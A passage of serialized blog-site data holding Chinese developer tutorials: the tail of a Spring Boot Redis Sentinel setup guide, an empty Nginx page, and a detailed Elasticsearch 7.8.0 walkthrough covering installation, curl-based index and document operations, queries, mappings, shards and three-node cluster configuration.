实例是同一台，意思就是可以一起使用，不需要在部署一个哨兵。\n\n./redis-server ../sentinel.conf --sentinel\n\n\n1\n\n\n启动后记得查看日志，一些不为人知的配置错误都会在日志里面显示。其中会有一台一直输出和其他哨兵连接的信息。\n\n\n# spring boot redis 哨兵\n\nmaven，只放关于 redis 的\n\n    <dependencies>\n        <dependency>\n            <groupid>org.springframework.boot</groupid>\n            <artifactid>spring-boot-starter-data-redis</artifactid>\n        </dependency>\n        \n        <dependency>\n            <groupid>org.apache.commons</groupid>\n            <artifactid>commons-pool2</artifactid>\n        </dependency>\n    </dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n配置文件\n\nspring\n  redis:\n    timeout: 10000\n    sentinel:\n      nodes:\n        - 192.168.81.101:26379\n        - 192.168.81.102:26379\n      password: ilovejj\n      master: mymaster\n      # 这是我框架自己得一个属性大家忽略\n      enable: true\n    lettuce:\n      pool:\n        max-wait: 10000\n        max-active: 30\n        max-idle: 15\n        min-idle: 15\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n配置类\n\npackage com.giant.cloud.config;\n\nimport lombok.extern.slf4j.slf4j;\nimport org.apache.commons.pool2.impl.genericobjectpoolconfig;\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.boot.autoconfigure.condition.conditionalonexpression;\nimport org.springframework.boot.autoconfigure.data.redis.redisproperties;\nimport org.springframework.context.annotation.bean;\nimport org.springframework.context.annotation.configuration;\nimport org.springframework.data.redis.connection.redissentinelconfiguration;\nimport org.springframework.data.redis.connection.lettuce.lettuceclientconfiguration;\nimport org.springframework.data.redis.connection.lettuce.lettuceconnectionfactory;\nimport org.springframework.data.redis.connection.lettuce.lettucepoolingclientconfiguration;\n\nimport java.util.hashset;\n\n/**\n * @author big uncle\n * @date 2020/11/17 11:57\n * @module\n **/\n@configuration\n@slf4j\n@conditionalonexpression("${spring.redis.sentinel.enable:false}")\npublic class redissentinelconfig {\n\n\n    @autowired\n    redisproperties redisproperties;\n\n    /**\n     * genericobjectpoolconfig 连接池配置\n     */\n    @bean\n    public genericobjectpoolconfig genericobjectpoolconfig() {\n        genericobjectpoolconfig genericobjectpoolconfig = new genericobjectpoolconfig();\n        genericobjectpoolconfig.setmaxidle(redisproperties.getlettuce().getpool().getmaxidle());\n        genericobjectpoolconfig.setminidle(redisproperties.getlettuce().getpool().getminidle());\n        genericobjectpoolconfig.setmaxtotal(redisproperties.getlettuce().getpool().getmaxactive());\n        genericobjectpoolconfig.setmaxwaitmillis(redisproperties.getlettuce().getpool().getmaxwait().tomillis());\n        return genericobjectpoolconfig;\n    }\n\n    /**\n     * 哨兵\n    **/\n    @bean\n    public lettuceconnectionfactory redisconnectionfactory(genericobjectpoolconfig genericobjectpoolconfig) {\n        redissentinelconfiguration redissentinelconfiguration = new redissentinelconfiguration(redisproperties.getsentinel().getmaster(),\n                new hashset<>(redisproperties.getsentinel().getnodes()));\n        redissentinelconfiguration.setpassword(redisproperties.getsentinel().getpassword());\n        // 配置池\n        lettuceclientconfiguration clientconfig = lettucepoolingclientconfiguration.builder()\n                .commandtimeout(redisproperties.gettimeout())\n                .poolconfig(genericobjectpoolconfig)\n                .build();\n        lettuceconnectionfactory lettuceconnectionfactory = new lettuceconnectionfactory(redissentinelconfiguration,clientconfig);\n        log.debug("redis 哨兵启动");\n        return lettuceconnectionfactory;\n    }\n\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n',charsets:{cjk:!0}},{title:"Nginx 基本概念及介绍",frontmatter:{title:"Nginx 基本概念及介绍",date:"2023-06-25T09:22:36.000Z",permalink:"/nginx/1",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/02.%E4%B8%AD%E9%97%B4%E4%BB%B6/04.nginx/1700.Nginx%20%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%E5%8F%8A%E4%BB%8B%E7%BB%8D.html",relativePath:"02.中间件/04.nginx/1700.Nginx 基本概念及介绍.md",key:"v-44194b63",path:"/nginx/1/",headers:[{level:2,title:"概念",slug:"概念",normalizedTitle:"概念",charIndex:2}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"概念",content:"# 概念",normalizedContent:"# 概念",charsets:{cjk:!0}},{title:"ES 7.8.0（一） 入门介绍",frontmatter:{title:"ES 7.8.0（一） 入门介绍",date:"2023-06-25T09:22:36.000Z",permalink:"/es/1800",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/02.%E4%B8%AD%E9%97%B4%E4%BB%B6/05.Elasticsearch/1800.ES%207.8.0%EF%BC%88%E4%B8%80%EF%BC%89%20%E5%85%A5%E9%97%A8%E4%BB%8B%E7%BB%8D.html",relativePath:"02.中间件/05.Elasticsearch/1800.ES 7.8.0（一） 入门介绍.md",key:"v-5b4e4ae2",path:"/es/1800/",headers:[{level:2,title:"基础概念",slug:"基础概念",normalizedTitle:"基础概念",charIndex:2},{level:2,title:"单机安装",slug:"单机安装",normalizedTitle:"单机安装",charIndex:531},{level:2,title:"数据格式简介",slug:"数据格式简介",normalizedTitle:"数据格式简介",charIndex:2577},{level:2,title:"基本操作",slug:"基本操作",normalizedTitle:"基本操作",charIndex:3434},{level:3,title:"索引",slug:"索引",normalizedTitle:"索引",charIndex:11},{level:4,title:"创建索引",slug:"创建索引",normalizedTitle:"创建索引",charIndex:3449},{level:4,title:"查看索引",slug:"查看索引",normalizedTitle:"查看索引",charIndex:3531},{level:4,title:"删除索引",slug:"删除索引",normalizedTitle:"删除索引",charIndex:3713},{level:3,title:"文档操作",slug:"文档操作",normalizedTitle:"文档操作",charIndex:3799},{level:4,title:"创建文档",slug:"创建文档",normalizedTitle:"创建文档",charIndex:3807},{level:4,title:"查询文档",slug:"查询文档",normalizedTitle:"查询文档",charIndex:5112},{level:4,title:"修改文档",slug:"修改文档",normalizedTitle:"修改文档",charIndex:5325},{level:3,title:"条件查询",slug:"条件查询",normalizedTitle:"条件查询",charIndex:6240},{level:3,title:"全文检索&完全匹配&高亮查询&聚合查询",slug:"全文检索-完全匹配-高亮查询-聚合查询",normalizedTitle:"全文检索 &amp; 完全匹配 &amp; 高亮查询 &amp; 聚合查询",charIndex:null},{level:3,title:"映射关系",slug:"映射关系",normalizedTitle:"映射关系",charIndex:9821},{level:3,title:"分片及副本",slug:"分片及副本",normalizedTitle:"分片及副本",charIndex:11809},{level:2,title:"集群搭建",slug:"集群搭建",normalizedTitle:"集群搭建",charIndex:12901}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"基础概念 单机安装 数据格式简介 基本操作 索引 创建索引 查看索引 删除索引 文档操作 创建文档 查询文档 修改文档 条件查询 全文检索&完全匹配&高亮查询&聚合查询 映射关系 分片及副本 集群搭建",content:'# 基础概念\n\n * 索引（index）\n   ES 的索引类似于 MySQL 的库\n * 类型（type）\n   在一个索引中可以有一个或多个类型，通常会为相同文档格式的归为一个类型，但在 ES7.x 默认不在支持索引类型的操作，文档和索引直接产生关系。\n * 文档（doc）\n   文档就是我们的 JSON 数据，一个索引有多个文档\n * 字段（field）\n   就是文档 JSON 中的属性\n * 映射（mapping）\n   MySQL 表中会有相关的字段类型，是否为空，长度多少，是否索引，这些和 ES 中的 Mapping 相似，可以定义一个属性，以及他的类型，是否可以被索引等。\n * 分片（Shards）\n   ES 的分片相当于 MySQL 的水平分表，比如 id % 5，不同结果落到各个被定义好的表中，可以扩展我们的存储容量，有效提高查询性能\n * 副本（replicas）\n   分片可以把数据分布到各个节点上，统一提高服务，可某个节点崩溃就会导致数据的丢失，副本就是保证分片的数据高可用的一种方案，把数据在另一台服务器复制一份。副本也可以提升一定的性能，因为搜索可以在所有的副本上并运行。\n * 分配（Allocation）\n\n\n# 单机安装\n\n官网地址：https://www.elastic.co/cn/downloads/past-releases#elasticsearch，需要用一些科学手段，否则内容加载不全，不好找到我么你需要的版。\n\n# 下载\nwget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.8.0-linux-x86_64.tar.gz\n# 解压\ntar -xvf elasticsearch-7.8.0-linux-x86_64.tar.gz\n# 启动\ncd elasticsearch-7.8.0/bin\n./elasticsearch\n# 报错，我得是jdk8，他需要jdk11\nfuture versions of Elasticsearch will require Java 11; your Java version from [/opt/software/jdk/jre] does not meet this requirement\n\n# 修改es配置文件\ncd elasticsearch-7.8.0/bin\nvim elasticsearch-env\n# 找到有JAVA_HOME的判断，设置成 es 自带的jdk，如下是我的\nif [ ! -z "$JAVA_HOME" ]; then\n  JAVA="/opt/software/elasticsearch-7.8.0/jdk/bin/java"\n  JAVA_TYPE="JAVA_HOME"\nelse\n# 重新启动，然后又报错，意思是不能用root运行\norg.elasticsearch.bootstrap.StartupException: java.lang.RuntimeException: can not run elasticsearch as root\n\n# 创建用户，并赋予权限\nadduser es\n# 修改es用户的密码\npasswd es\n# 修改\nchown -R es:es elasticsearch-7.8.0/ \n# 切换用户登录，启动程序\nsu es\n\n# 如果遇到该类报错\nERROR: [3] bootstrap checks failed\n[1]: max file descriptors [4096] for elasticsearch process is too low, increase to at least [65535]\n[2]: max virtual memory areas vm.max_map_count [65530] is too low, increase to at least [262144]\n[3]: the default discovery settings are unsuitable for production use; at least one of [discovery.seed_hosts, discovery.seed_providers, cluster.initial_master_nodes] must be configured\n\n# 需要修改一下参数，进入 vim /etc/security/limits.conf\n# sandwich表示运行elasticsearch的用户，hard与soft表示限制的类型，nofile表示max number of open file descriptors，65536表示设置的大小。\n# 这个值最终影响的是 ulimit 的open files的最大值\n* hard nofile 65536\n* soft nofile 65536\n# 修改另一个文件， vim /etc/sysctl.conf，添加如下，后执行 sysctl -p\nvm.max_map_count=655360\n# 修改 vim elasticsearch.yml，配置远程访问，及修改以上问题\nnetwork.host: 0.0.0.0\ndiscovery.seed_hosts: ["10.240.30.93"]\ncluster.initial_master_nodes: ["master"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n> 端 9300 端口为 ES 集群间组件的通信口，9200 端口为浏览器访问的 http 协议 restful 端口。当 ES 启动成功后我们可以通过访问 http://localhost:9200 测试结果\n\n\n# 数据格式简介\n\nElasticsearch 是面向文档型数据库，一条数据在这里就是一个文档。为了方便大家理解，我们 Elasticsearch 里存储文档数据和关系型数据库 MYSQL 存储数据的概念进行一个类比\n\n\n\nES 里的 Index 可以看做一个库，而 Types 相当于表，Document 则相当于表的行。这里 Types 的概念已经被主键弱化，ES6.x 中，一个 Index 下已经只能包含一个 Type，ES7.x 中，Type 的概念已经被删除了。\n\n在 MySQL 中索引是帮助查询进行快速检索，但在 ES 中为了能够坐高快速准确的查询，他使用了 倒排索引 ，有倒排索引则对应有 正排索引\n\n * 正排（正向）索引 -> 在 MySQL 中，如 id，content 两个字段，通过 id 并赋予一定的索引，可以快速检索到该列满足条件的数据，但如果通过内容查询则比较麻烦，需要做模糊查询，每条数据都需要遍历，效率低下，而且还要区分内容的大小写等。\n\n      id                   content\n-------------------------------------------\n   1001                my name is zs\n   1002                my name is ls\n\n\n1\n2\n3\n4\n\n * 倒排索引 -> 倒排索引是实现 “单词 - 文档矩阵” 的一种具体存储形式，通过倒排索引，可以根据单词快速获取包含这个单词的文档列表。\n\n      keyword               id\n-------------------------------------------\n        my              1001,1002\n        ls              1002\n        zs              1001\n\n\n1\n2\n3\n4\n5\n\n\n\n# 基本操作\n\n\n# 索引\n\n# 创建索引\n\ncurl --location --request PUT \'http://10.240.30.93:9200/test_index\'\n\n\n1\n\n\n# 查看索引\n\n查询某个索引的信息\n\ncurl --location --request GET \'http://10.240.30.93:9200/test_index\'\n\n\n1\n\n\n查看所有索引有哪些\n\ncurl --location --request GET \'http://10.240.30.93:9200/_cat/indices?v\'\n\n\n1\n\n\n# 删除索引\n\ncurl --location --request DELETE \'http://10.240.30.93:9200/test_index\'\n\n\n1\n\n\n\n# 文档操作\n\n# 创建文档\n\n创建一个随机生成 ID 的文档，索引是 test_index\n\ncurl --location --request POST \'http://10.240.30.93:9200/test_index/_doc\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n   "min_position": 7,\n   "has_more_items": false,\n   "items_html": "Bike",\n   "new_latent_count": 5,\n   "data": {\n      "length": 21,\n      "text": "Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur."\n   },\n   "objArray": [\n      {\n         "class": "lower",\n         "age": 2\n      },\n      {\n         "class": "lower",\n         "age": 1\n      }\n   ]\n}‘\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n创建一个自定义 ID 位 1003 的文档，\n\ncurl --location --request POST \'http://10.240.30.93:9200/test_index/_doc/1003\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "min_position": 7,\n    "has_more_items": false,\n    "items_html": "Bike",\n    "new_latent_count": 5,\n    "data": {\n        "length": 21,\n        "text": "Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur."\n    },\n    "objArray": [\n        {\n            "class": "lower",\n            "age": 2\n        },\n        {\n            "class": "lower",\n            "age": 1\n        }\n    ]\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n# 查询文档\n\n通过 ID 查询文档\n\ncurl --location --request GET \'http://10.240.30.93:9200/test_index/_doc/1003\'\n\n\n1\n\n\n查看 test_index 下的所有文档\n\ncurl --location --request GET \'http://10.240.30.93:9200/test_index/_doc/_search\'\n\n\n1\n\n\n# 修改文档\n\n完全覆盖以前文档的内容\n\n curl --location --request PUT \'http://10.240.30.93:9200/test_index/_doc/1003\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n   "data": {\n      "length": 26,\n      "text": "Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."\n   },\n   "numericalArray": [\n      30,\n      33,\n      31,\n      20,\n      30\n   ],\n   "StringArray": [\n      "Carbon",\n      "Oxygen",\n      "Carbon",\n      "Oxygen"\n   ]\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n只修改文档中某些属性的值\n\ncurl --location --request POST \'http://10.240.30.93:9200/test_index/_update/1003\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "doc":{\n        "data":{\n            "text": "1111111111"\n        }\n    }\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n通过 ID 删除某个文档\n\ncurl --location --request DELETE \'http://10.240.30.93:9200/test_index/_doc/1003\' \n\n\n1\n\n\n\n# 条件查询\n\n通过请求路径添加参数，注意附加 q（query） 条件的意思\n\ncurl --location --request GET \'http://10.240.30.93:9200/test_index/_doc/_search?q=items_html:Bike\'\n\n\n1\n\n\n通过 body 体附加条件进行查询\n\ncurl --location --request GET \'http://10.240.30.93:9200/test_index/_doc/_search\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "query":{\n        "match":{\n            "items_html":"Bike"\n        }\n    }\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n通过 body 体加条件查询索引下全部文档\n\ncurl --location --request GET \'http://10.240.30.93:9200/test_index/_doc/_search\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "query":{\n        "match_all":{\n            \n        }\n    }\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n分页查询，from 为起始位置，size 为每页大小，分页 =（from-1）*size；_source 可以指定我们需要查询的具体属性值，类似于 mysql 我们只想看哪些列的数据。\n\ncurl --location --request GET \'http://10.240.30.93:9200/test_index/_doc/_search\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "query":{\n        "match_all":{\n            \n        }\n    },\n    "from": 0,\n    "size": 2,\n    "_source": ["min_position"]\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n对数据进行排序\n\ncurl --location --request GET \'http://10.240.30.93:9200/test_index/_doc/_search\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "query":{\n        "match_all":{\n            \n        }\n    },\n    "sort":{\n        "new_latent_count": {\n            "order": "desc"\n        }\n    }\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n多条件查询，如下类似于 MySQL and 条件\n\n * must，是 and\n * should，是 or\n * fileter，是范围查询 <<=> >=\n\ncurl --location --request GET \'http://10.240.30.93:9200/test_index/_doc/_search\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "query":{\n        "bool":{\n            "must":[\n                {\n                    "match":{\n                        "items_html": "Bike"\n                    }\n                },\n                {\n                    "match":{\n                        "has_more_items": false\n                    }\n                }\n\n            ]\n        }\n    }\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\ncurl --location --request GET \'http://10.240.30.93:9200/test_index/_doc/_search\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "query":{\n        "bool":{\n            "filter":{\n                "range":{\n                    "data.length": {\n                        "gt": 19\n                    }\n                }\n            }\n        }\n    }\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# 全文检索 & 完全匹配 & 高亮查询 & 聚合查询\n\n按照单词查询，只要包含这个单词全部查询出来，如果是汉子的话会把每个汉子放进倒排索引中，该方式称为全文检索。match 是全文匹配，更换为 match_phrase 则是完全匹配。\n\ncurl --location --request GET \'http://10.240.30.93:9200/test_index/_doc/_search\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "query":{\n        "match":{\n            "data.text":"Duis"\n        }\n    }\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n高亮查询，我们可以设置高亮来让匹配的内容进行明显的显示\n\ncurl --location --request GET \'http://10.240.30.93:9200/test_index/_doc/_search\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "query":{\n        "match":{\n            "data.text":"Duis"\n        }\n    },\n    "highlight":{\n        "fields":{\n            "data.text": {}\n        }\n    }\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n聚合查询，对相同内容进行次数统计\n\ncurl --location --request GET \'http://10.240.30.93:9200/test_index/_doc/_search\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "aggs":{ // 聚合操作\n        "min_position_count":{ // 聚合后的名称，可以随意起名\n            "terms": { // 分组操作\n                "field": "min_position" // 分组字段\n            }\n        }\n    },\n    "size": 0 // 表示不显示原始数据\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 映射关系\n\n有的属性可以分词查询，有的属性不能分词查询，这个分还是不分，我们是可以设置的。在 Mysql 中表的一个字段的类型、长度这些信息都属于表的结构信息，在 ES 中也有类似的概念，我们称之为映射。\n\n# 创建一个 user 索引\ncurl --location --request PUT \'http://10.240.30.93:9200/user\'\n\n# 创建结构信息\ncurl --location --request PUT \'http://10.240.30.93:9200/user/_mapping\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "properties": { // 定义结构化信息\n        // 定义一个name 属性\n        "name": {\n            "type": "text", // name类型为 text文本(可以被分词)\n            "index": true // 表示该字段可以被索引查询\n        },\n        "sex": {\n            "type": "keyword", // 表示不能被分词，需要完整匹配\n            "index": true // 表示该字段使用索引\n        },\n        "tel": {\n            "type": "keyword", // 表示不能被分词，需要完整匹配\n            "index": false // 表示不能被索引\n        }\n    }\n}\'\n\n# 查看结构化信息\ncurl --location --request GET \'http://10.240.30.93:9200/user/_mapping\' \\\n--data-raw \'\'\n\n# 增加数据\ncurl --location --request POST \'http://10.240.30.93:9200/user/_doc/1003\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "name": "张三",\n    "sex": "男",\n    "tel": "135xxxxxx05"\n}\'\n\n# 有分词效果的查询\ncurl --location --request GET \'http://10.240.30.93:9200/user/_doc/_search\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "query":{\n        "match":{\n            "name":"张"\n        }\n    }\n}\'\n\n# 全部匹配，sex只对应以上值能是 男，如果值是 男的，那么键入 男 也是查不到的，必须是男的\ncurl --location --request GET \'http://10.240.30.93:9200/user/_doc/_search\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "query":{\n        "match":{\n            "sex":"男的"\n        }\n    }\n}\'\n\n# 不能被索引（index: false），索引该属性则会报错，因为不能被索引（查询）\ncurl --location --request GET \'http://10.240.30.93:9200/user/_doc/_search\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "query":{\n        "match":{\n            "tel":"135xxxxxx05"\n        }\n    }\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n\n\n\n# 分片及副本\n\n创建 user 索引，并为其创建 3 个分片，以及各主分片都有 1 个副本\n\ncurl --location --request PUT \'http://10.240.30.93:9200/user\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "settings":{\n        "number_of_shards": 3, // 对索引下的文档创建3个分片\n        "number_of_replicas": 1 // 每个主分片都有1个副本\n    }\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n查询所创建的索引\n\ncurl --location --request GET \'http://10.240.30.93:9200/user\' \n\n{\n    "user": {\n        "aliases": {},\n        "mappings": {},\n        "settings": {\n            "index": {\n                "creation_date": "1653730124456",\n                "number_of_shards": "3", // 分片\n                "number_of_replicas": "1", // 副本\n                "uuid": "E7Li_zHoRHWfsnkgOCy3Tg",\n                "version": {\n                    "created": "7080099"\n                },\n                "provided_name": "user"\n            }\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n修改副本的数量\n\ncurl --location --request PUT \'http://10.240.30.93:9200/user/_settings\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "number_of_replicas": 2\n}\'\n\n\n1\n2\n3\n4\n5\n\n\n\n# 集群搭建\n\n一个集群是由多个服务器节点组织在一起，共同持有整个的数据，并一起提供索引和搜索功能。一个 ES 集群有一个唯一的名字，整个名字默认就是 "Elasticsearch"。这个名字是重要的。因为一个节点只能通过指定某个集群的名字，来加入这个集群。\n\n集群中包含很多的服务器，一个节点就是其中一个服务器。作为集群的一部分，它存储数据，参与集群的索引和搜索功能。\n\n一个节点也是由名字来标识的，默认情况下，这个名字是一个随机漫威漫画角色的名字，这个名字会在启动的时候赋予节点。这个名字对于管理工作来说很重要，因为在这个管理过程中，你回去确定网络中的哪些服务器对应于 Elasticsearch 集群中的哪些节点。\n\n一个节点可以通过配置集群名称的方式来加入一个指定的集群。默认情况下，每个节点都会被安排加入到一个叫做 "elasticsearch" 的集群中，这意味着，如果你在你的网络中启动了若干个节点，并假定他们能够相互发现彼此，他们将会自动形成并加入到一个叫做 "elasticsearch" 的集群中。\n\n# node1 修改 elasticsearch.yml\ncluster.name: elasticsearch-1 # 指定集群的名称\nnode.name: node1 # 指定节点的名称\nnode.master: true # 让该节点作为主节点\nnode.data: true # 让该节点作为数据节点\nnetwork.host: node1 # 指定本机的IP，我的在 host中做个映射\nhttp.port: 9200 # http 请求地址\ntransport.tcp.port: 9300 # 集群通信端口\nhttp.cors.enabled: true # 跨域配置\nhttp.cors.allow-origin: "*"\nhttp.max_content_length: 200mb # 单条数据最大内容为200Mb的数据\n\ncluster.initial_master_nodes: ["node1"] # es7.x之后新增的配置，初始化个新的集群时需要此配置来选举master\ndiscovery.seed_hosts: ["node1:9300","node2:9300","node3:9300"] # 节点发现\ngateway.recover_after_nodes: 2\nnetwork.tcp.keep_alive: true\nnetwork.tcp.no_delay: true\ntransport.tcp.compress: true\n\ncluster.routing.allocation.cluster_concurrent_rebalance: 16 # 集群内同时启动的数据任务个数，默认是2个\ncluster.routing.allocation.node_concurrent_recoveries: 16 # 添加或删除节点及负载均衡时并发恢复的线程个数，默认4个\ncluster.routing.allocation.node_initial_primaries_recoveries: 16 # 初始化数据恢复时，并发恢复线程的个数，默认4个\n\n# node2 修改 elasticsearch.yml\ncluster.name: elasticsearch-1 # 指定集群的名称\nnode.name: node2 # 指定节点的名称\nnode.master: true # 让该节点作为主节点\nnode.data: true # 让该节点作为数据节点\nnetwork.host: node2 # 指定本机的IP，我的在 host中做个映射\nhttp.port: 9200 # http 请求地址\ntransport.tcp.port: 9300 # 集群通信端口\nhttp.cors.enabled: true # 跨域配置\nhttp.cors.allow-origin: "*"\nhttp.max_content_length: 200mb # 单条数据最大内容为200Mb的数据\n\ncluster.initial_master_nodes: ["node1"] # es7.x之后新增的配置，初始化个新的集群时需要此配置来选举master\ndiscovery.seed_hosts: ["node1:9300","node2:9300","node3:9300"] # 节点发现\ngateway.recover_after_nodes: 2\nnetwork.tcp.keep_alive: true\nnetwork.tcp.no_delay: true\ntransport.tcp.compress: true\n\ncluster.routing.allocation.cluster_concurrent_rebalance: 16 # 集群内同时启动的数据任务个数，默认是2个\ncluster.routing.allocation.node_concurrent_recoveries: 16 # 添加或删除节点及负载均衡时并发恢复的线程个数，默认4个\ncluster.routing.allocation.node_initial_primaries_recoveries: 16 # 初始化数据恢复时，并发恢复线程的个数，默认4个\n\n\n# node3 修改 elasticsearch.yml\ncluster.name: elasticsearch-1 # 指定集群的名称\nnode.name: node3 # 指定节点的名称\nnode.master: true # 让该节点作为主节点\nnode.data: true # 让该节点作为数据节点\nnetwork.host: node3 # 指定本机的IP，我的在 host中做个映射\nhttp.port: 9200 # http 请求地址\ntransport.tcp.port: 9300 # 集群通信端口\nhttp.cors.enabled: true # 跨域配置\nhttp.cors.allow-origin: "*"\nhttp.max_content_length: 200mb # 单条数据最大内容为200Mb的数据\n\ncluster.initial_master_nodes: ["node1"] # es7.x之后新增的配置，初始化个新的集群时需要此配置来选举master\ndiscovery.seed_hosts: ["node1:9300","node2:9300","node3:9300"] # 节点发现\ngateway.recover_after_nodes: 2\nnetwork.tcp.keep_alive: true\nnetwork.tcp.no_delay: true\ntransport.tcp.compress: true\n\ncluster.routing.allocation.cluster_concurrent_rebalance: 16 # 集群内同时启动的数据任务个数，默认是2个\ncluster.routing.allocation.node_concurrent_recoveries: 16 # 添加或删除节点及负载均衡时并发恢复的线程个数，默认4个\ncluster.routing.allocation.node_initial_primaries_recoveries: 16 # 初始化数据恢复时，并发恢复线程的个数，默认4个\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n\n\n我们可以通过 ES 提供的接口 API 来查看集群的状态\n\n# 查看节点\ncurl --location --request GET \'http://10.240.30.93:9200/_cat/nodes\'\n\n# 查看集群状态\ncurl --location --request GET \'http://10.240.30.93:9200/_cluster/health\'\n\n# 返回信息\n{\n    "cluster_name": "elasticsearch-1", // 集群名称\n    "status": "yellow",\n    "timed_out": false,\n    "number_of_nodes": 1, // 有多少个节点\n    "number_of_data_nodes": 1, // 有多少个数据节点\n    "active_primary_shards": 2, // 分片\n    "active_shards": 2,\n    "relocating_shards": 0,\n    "initializing_shards": 0,\n    "unassigned_shards": 2,\n    "delayed_unassigned_shards": 0,\n    "number_of_pending_tasks": 0,\n    "number_of_in_flight_fetch": 0,\n    "task_max_waiting_in_queue_millis": 0,\n    "active_shards_percent_as_number": 50.0\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n当你在同一台服务器上启动两个节点时，只要他和第一个节点的 cluster.name 